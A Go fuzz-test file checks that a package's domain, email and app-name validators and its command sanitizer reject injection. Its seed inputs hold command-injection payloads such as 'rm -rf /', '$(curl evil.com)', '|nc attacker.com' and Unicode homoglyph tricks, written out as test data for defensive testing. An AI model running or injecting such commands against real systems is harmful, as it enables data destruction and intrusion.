package crypto

import (
	"os"
	"strings"
	"testing"
	"time"
	"unicode"
)

// FuzzValidateDomainName performs comprehensive fuzzing of domain name validation
func FuzzValidateDomainName(f *testing.F) {
	// Seed with known injection payloads
	f.Add("example.com")
	f.Add("test.com;rm -rf /")
	f.Add("example.com|whoami")
	f.Add("test.com`id`")
	f.Add("example.com$(curl evil.com)")
	f.Add("test.com&ping attacker.com")
	f.Add("example.com\nrm -rf /")
	f.Add("test.com\rcurl evil.com")
	f.Add("example.com'")
	f.Add("test.com\"")
	f.Add("example.com>output.txt")
	f.Add("test.com<input.txt")
	f.Add("example.com\x00")
	f.Add("localhost")
	f.Add("127.0.0.1")
	f.Add("internal")
	f.Add("*.local")
	f.Add("")
	f.Add(".")
	f.Add("..")
	f.Add("-example.com")
	f.Add("example.com-")
	f.Add(".example.com")
	f.Add("example.com.")
	f.Add(strings.Repeat("a", 300) + ".com")
	f.Add(strings.Repeat("a", 64) + ".com")

	// Unicode attack vectors
	f.Add("example.com\uFF1Brm")  // Fullwidth semicolon
	f.Add("test.com\uFF5Cwhoami") // Fullwidth pipe
	f.Add("example\u200B.com")    // Zero-width space
	f.Add("еxample.com")          // Cyrillic е
	f.Add("example\u202E.com")    // RTL override

	f.Fuzz(func(t *testing.T, domain string) {
		// Set production environment for consistent testing
		originalEnv := os.Getenv("GO_ENV")
		os.Setenv("GO_ENV", "production")
		defer func() {
			if originalEnv == "" {
				os.Unsetenv("GO_ENV")
			} else {
				os.Setenv("GO_ENV", originalEnv)
			}
		}()

		err := ValidateDomainName(domain)

		// If validation passes, ensure the domain meets basic safety requirements
		if err == nil {
			// Must not contain dangerous characters
			for _, char := range dangerousChars {
				if strings.Contains(domain, char) {
					t.Errorf("Domain validation passed but contains dangerous character '%s': %s", char, domain)
				}
			}

			// Must not be suspicious domain
			lowerDomain := strings.ToLower(domain)
			suspiciousDomains := []string{"localhost", "127.0.0.1", "::1", "0.0.0.0", "internal", "local"}
			for _, suspicious := range suspiciousDomains {
				if lowerDomain == suspicious || strings.Contains(lowerDomain, suspicious) {
					t.Errorf("Domain validation passed but contains suspicious pattern '%s': %s", suspicious, domain)
				}
			}

			// Must not exceed length limits
			if len(domain) > MaxDomainLength {
				t.Errorf("Domain validation passed but exceeds max length %d: %s (len=%d)", MaxDomainLength, domain, len(domain))
			}

			// Must not have consecutive dots
			if strings.Contains(domain, "..") {
				t.Errorf("Domain validation passed but contains consecutive dots: %s", domain)
			}

			// Must not start/end with invalid characters
			if len(domain) > 0 {
				if domain[0] == '-' || domain[0] == '.' {
					t.Errorf("Domain validation passed but starts with invalid character: %s", domain)
				}
				if domain[len(domain)-1] == '-' || domain[len(domain)-1] == '.' {
					t.Errorf("Domain validation passed but ends with invalid character: %s", domain)
				}
			}
		}

		// Ensure error messages don't leak dangerous input
		if err != nil {
			errorMsg := err.Error()
			// Check that dangerous characters aren't reflected in error messages
			for _, char := range []string{";", "|", "`", "$", "&", "\"", "'", "\n", "\r"} {
				if strings.Contains(domain, char) && strings.Contains(errorMsg, char) {
					t.Errorf("Error message contains dangerous character '%s': %s", char, errorMsg)
				}
			}
		}
	})
}

// FuzzValidateEmailAddress performs comprehensive fuzzing of email validation
func FuzzValidateEmailAddress(f *testing.F) {
	// Seed with various email patterns and injection attempts
	f.Add("user@example.com")
	f.Add("test@example.com;curl evil.com")
	f.Add("user@test.com|nc attacker.com")
	f.Add("admin@example.com`whoami`")
	f.Add("user@test.com$(curl evil.com)")
	f.Add("test@example.com&ping attacker.com")
	f.Add("user@test.com\nrm -rf /")
	f.Add("admin@example.com'")
	f.Add("user@test.com\"")
	f.Add("test@example.com>output")
	f.Add("user@localhost")
	f.Add("admin@internal")
	f.Add("user@127.0.0.1")
	f.Add("")
	f.Add("@")
	f.Add("@@")
	f.Add("user@")
	f.Add("@example.com")
	f.Add("user..test@example.com")
	f.Add(".user@example.com")
	f.Add("user.@example.com")
	f.Add(strings.Repeat("a", 300) + "@example.com")
	f.Add("user@" + strings.Repeat("a", 300) + ".com")

	// Unicode attacks
	f.Add("user@example.com\uFF1Bcurl") // Fullwidth semicolon
	f.Add("user\u200B@test.com")        // Zero-width space
	f.Add("user@еxample.com")           // Cyrillic domain

	f.Fuzz(func(t *testing.T, email string) {
		err := ValidateEmailAddress(email)

		// If validation passes, ensure email meets safety requirements
		if err == nil {
			// Must contain exactly one @
			atCount := strings.Count(email, "@")
			if atCount != 1 {
				t.Errorf("Email validation passed but has %d @ symbols: %s", atCount, email)
			}

			// Must not contain dangerous characters (except allowed ones)
			for _, char := range dangerousChars {
				if strings.Contains(email, char) && char != "." && char != "+" && char != "-" && char != "_" {
					t.Errorf("Email validation passed but contains dangerous character '%s': %s", char, email)
				}
			}

			// Must not exceed length limits
			if len(email) > MaxEmailLength {
				t.Errorf("Email validation passed but exceeds max length %d: %s (len=%d)", MaxEmailLength, email, len(email))
			}

			// Must not have consecutive dots
			if strings.Contains(email, "..") {
				t.Errorf("Email validation passed but contains consecutive dots: %s", email)
			}

			// Validate parts
			parts := strings.Split(email, "@")
			if len(parts) == 2 {
				localPart := parts[0]
				if len(localPart) == 0 || len(localPart) > 64 {
					t.Errorf("Email validation passed but local part length invalid: %s (len=%d)", localPart, len(localPart))
				}
				if len(localPart) > 0 && (localPart[0] == '.' || localPart[len(localPart)-1] == '.') {
					t.Errorf("Email validation passed but local part starts/ends with dot: %s", localPart)
				}
			}
		}

		// Ensure error messages don't leak dangerous input
		if err != nil {
			errorMsg := err.Error()
			for _, char := range []string{";", "|", "`", "$", "&", "\"", "'", "\n", "\r"} {
				if strings.Contains(email, char) && strings.Contains(errorMsg, char) {
					t.Errorf("Error message contains dangerous character '%s': %s", char, errorMsg)
				}
			}
		}
	})
}

// FuzzValidateAppName performs comprehensive fuzzing of application name validation
func FuzzValidateAppName(f *testing.F) {
	// Seed with various app names and injection attempts
	f.Add("myapp")
	f.Add("myapp;rm -rf /")
	f.Add("app|whoami")
	f.Add("test`id`")
	f.Add("myapp$(curl evil.com)")
	f.Add("app&ping attacker.com")
	f.Add("test\nrm -rf /")
	f.Add("myapp'")
	f.Add("app\"")
	f.Add("test>output")
	f.Add("admin")
	f.Add("root")
	f.Add("system")
	f.Add("daemon")
	f.Add("api")
	f.Add("vault")
	f.Add("")
	f.Add("-")
	f.Add("-app")
	f.Add("app-")
	f.Add(strings.Repeat("a", 100))
	f.Add(strings.Repeat("a", 64))

	// Unicode attacks
	f.Add("myapp\uFF1Brm") // Fullwidth semicolon
	f.Add("app\u200B")     // Zero-width space
	f.Add("my\u200Bapp")   // Zero-width space in middle

	f.Fuzz(func(t *testing.T, appName string) {
		// Set production environment for reserved name checking
		originalEnv := os.Getenv("GO_ENV")
		os.Setenv("GO_ENV", "production")
		defer func() {
			if originalEnv == "" {
				os.Unsetenv("GO_ENV")
			} else {
				os.Setenv("GO_ENV", originalEnv)
			}
		}()

		err := ValidateAppName(appName)

		// If validation passes, ensure app name meets safety requirements
		if err == nil {
			// Must not contain dangerous characters (except hyphens)
			for _, char := range dangerousChars {
				if strings.Contains(appName, char) && char != "-" {
					t.Errorf("App name validation passed but contains dangerous character '%s': %s", char, appName)
				}
			}

			// Must not exceed length limits
			if len(appName) > MaxAppNameLength {
				t.Errorf("App name validation passed but exceeds max length %d: %s (len=%d)", MaxAppNameLength, appName, len(appName))
			}

			// Must not start/end with hyphen
			if len(appName) > 0 {
				if appName[0] == '-' || appName[len(appName)-1] == '-' {
					t.Errorf("App name validation passed but starts/ends with hyphen: %s", appName)
				}
			}

			// Must not be critical reserved names
			lowerAppName := strings.ToLower(appName)
			criticalReservedNames := []string{"admin", "root", "system", "daemon", "www", "ftp", "mail"}
			for _, reserved := range criticalReservedNames {
				if lowerAppName == reserved {
					t.Errorf("App name validation passed but is critical reserved name: %s", appName)
				}
			}

			// In production, must not be production reserved names
			productionReservedNames := []string{"api", "app", "web", "db", "database", "cache", "redis", "vault", "consul", "docker", "kubernetes", "k8s"}
			for _, reserved := range productionReservedNames {
				if lowerAppName == reserved {
					t.Errorf("App name validation passed but is production reserved name: %s", appName)
				}
			}
		}

		// Ensure error messages don't leak dangerous input
		if err != nil {
			errorMsg := err.Error()
			for _, char := range []string{";", "|", "`", "$", "&", "\"", "'", "\n", "\r"} {
				if strings.Contains(appName, char) && strings.Contains(errorMsg, char) {
					t.Errorf("Error message contains dangerous character '%s': %s", char, errorMsg)
				}
			}
		}
	})
}

// FuzzSanitizeInputForCommand tests the command input sanitization function
func FuzzSanitizeInputForCommand(f *testing.F) {
	// Seed with various injection attempts
	f.Add("cmd;rm -rf /")
	f.Add("cmd|whoami")
	f.Add("cmd`id`")
	f.Add("cmd$(curl evil.com)")
	f.Add("cmd&ping attacker.com")
	f.Add("cmd\nrm -rf /")
	f.Add("cmd\rcurl evil.com")
	f.Add("cmd'test'")
	f.Add("cmd\"test\"")
	f.Add("cmd\\test")
	f.Add("cmd\x00test")
	f.Add("safe-input.txt")
	f.Add("")

	f.Fuzz(func(t *testing.T, input string) {
		sanitized := SanitizeInputForCommand(input)

		// Ensure all dangerous characters are removed
		dangerousChars := []string{";", "&", "|", "`", "$", "\\", "'", "\"", "\n", "\r", "\t", "\x00"}
		for _, char := range dangerousChars {
			if strings.Contains(sanitized, char) {
				t.Errorf("Sanitization failed to remove dangerous character '%s' from: %s -> %s", char, input, sanitized)
			}
		}

		// Ensure sanitized output is not longer than input (only removal, no addition)
		if len(sanitized) > len(input) {
			t.Errorf("Sanitized output longer than input: %s (%d) -> %s (%d)", input, len(input), sanitized, len(sanitized))
		}

		// Ensure safe characters are preserved
		safeChars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._"
		for _, r := range input {
			if strings.ContainsRune(safeChars, r) {
				if !strings.ContainsRune(sanitized, r) {
					// Only fail if the safe character was completely removed, not just reduced in count
					inputCount := strings.Count(input, string(r))
					sanitizedCount := strings.Count(sanitized, string(r))
					if sanitizedCount > inputCount {
						t.Errorf("Safe character '%c' increased during sanitization: %s -> %s", r, input, sanitized)
					}
				}
			}
		}
	})
}

// FuzzValidateAllCertificateInputs tests the combined certificate input validation
func FuzzValidateAllCertificateInputs(f *testing.F) {
	// Seed with various combinations
	f.Add("app", "example.com", "user@test.com")
	f.Add("app;rm", "example.com", "user@test.com")
	f.Add("app", "example.com|whoami", "user@test.com")
	f.Add("app", "example.com", "user@test.com;curl evil.com")
	f.Add("admin", "localhost", "root@internal")
	f.Add("", "", "")
	f.Add(strings.Repeat("a", 100), strings.Repeat("b", 200)+".com", "user@test.com")

	f.Fuzz(func(t *testing.T, appName, baseDomain, email string) {
		// Set production environment
		originalEnv := os.Getenv("GO_ENV")
		os.Setenv("GO_ENV", "production")
		defer func() {
			if originalEnv == "" {
				os.Unsetenv("GO_ENV")
			} else {
				os.Setenv("GO_ENV", originalEnv)
			}
		}()

		err := ValidateAllCertificateInputs(appName, baseDomain, email)

		// If validation passes, ensure all components are safe
		if err == nil {
			// Individual validations should also pass
			if err := ValidateAppName(appName); err != nil {
				t.Errorf("Combined validation passed but app name validation failed: %v", err)
			}
			if err := ValidateDomainName(baseDomain); err != nil {
				t.Errorf("Combined validation passed but base domain validation failed: %v", err)
			}
			if err := ValidateEmailAddress(email); err != nil {
				t.Errorf("Combined validation passed but email validation failed: %v", err)
			}

			// Constructed FQDN should be valid
			fqdn := appName + "." + baseDomain
			if err := ValidateDomainName(fqdn); err != nil {
				t.Errorf("Combined validation passed but constructed FQDN invalid: %v", err)
			}

			// Total length should be reasonable
			if len(fqdn) > MaxDomainLength {
				t.Errorf("Combined validation passed but FQDN too long: %s (len=%d)", fqdn, len(fqdn))
			}
		}
	})
}

// FuzzRegexPatterns tests the regex patterns themselves for catastrophic backtracking
func FuzzRegexPatterns(f *testing.F) {
	// Seed with patterns designed to cause regex problems
	f.Add(strings.Repeat("a", 50) + "!")
	f.Add(strings.Repeat("(a|a)", 10))
	f.Add(strings.Repeat("a+", 20))
	f.Add(strings.Repeat(".*", 15))
	f.Add("a" + strings.Repeat("a?", 20) + "a")

	f.Fuzz(func(t *testing.T, input string) {
		// Test each regex pattern individually with timeout
		done := make(chan bool, 3)

		// Test domain pattern
		go func() {
			ValidDomainPattern.MatchString(input)
			done <- true
		}()

		// Test email pattern
		go func() {
			ValidEmailPattern.MatchString(input)
			done <- true
		}()

		// Test app name pattern
		go func() {
			ValidAppNamePattern.MatchString(input)
			done <- true
		}()

		// Wait for all regex tests with timeout
		timeout := Timeout(t, "1s")
		for i := 0; i < 3; i++ {
			select {
			case <-done:
				// Pattern completed successfully
			case <-timeout:
				t.Errorf("Regex pattern took too long (potential ReDoS) with input: %s", input)
				return
			}
		}
	})
}

// Helper function for regex timeout testing
func Timeout(t *testing.T, duration string) <-chan struct{} {
	t.Helper()
	timeout := make(chan struct{})
	go func() {
		switch duration {
		case "1s":
			<-time.After(1 * time.Second)
		case "5s":
			<-time.After(5 * time.Second)
		default:
			<-time.After(1 * time.Second)
		}
		close(timeout)
	}()
	return timeout
}

// FuzzUnicodeNormalization specifically tests Unicode-based attacks
func FuzzUnicodeNormalization(f *testing.F) {
	// Seed with Unicode normalization attack vectors
	f.Add("test\uFF1B") // Fullwidth semicolon
	f.Add("test\uFF5C") // Fullwidth vertical bar
	f.Add("test\u200B") // Zero-width space
	f.Add("test\u200C") // Zero-width non-joiner
	f.Add("test\u200D") // Zero-width joiner
	f.Add("test\u202E") // Right-to-left override
	f.Add("test\u202D") // Left-to-right override
	f.Add("test\u2063") // Invisible separator
	f.Add("test\u2062") // Invisible times
	f.Add("tеst")       // Cyrillic е

	f.Fuzz(func(t *testing.T, input string) {
		// Test if input contains non-ASCII characters
		hasNonASCII := false
		for _, r := range input {
			if r > unicode.MaxASCII {
				hasNonASCII = true
				break
			}
		}

		if hasNonASCII {
			// All Unicode inputs should be rejected by domain validation
			err := ValidateDomainName(input)
			if err == nil {
				t.Errorf("Domain validation should reject Unicode input: %s", input)
			}

			// Unicode in app names should also be rejected
			err = ValidateAppName(input)
			if err == nil {
				t.Errorf("App name validation should reject Unicode input: %s", input)
			}

			// Unicode in email local part should be rejected (basic email validation)
			if strings.Contains(input, "@") {
				err = ValidateEmailAddress(input)
				if err == nil {
					t.Errorf("Email validation should reject Unicode input: %s", input)
				}
			}
		}
	})
}
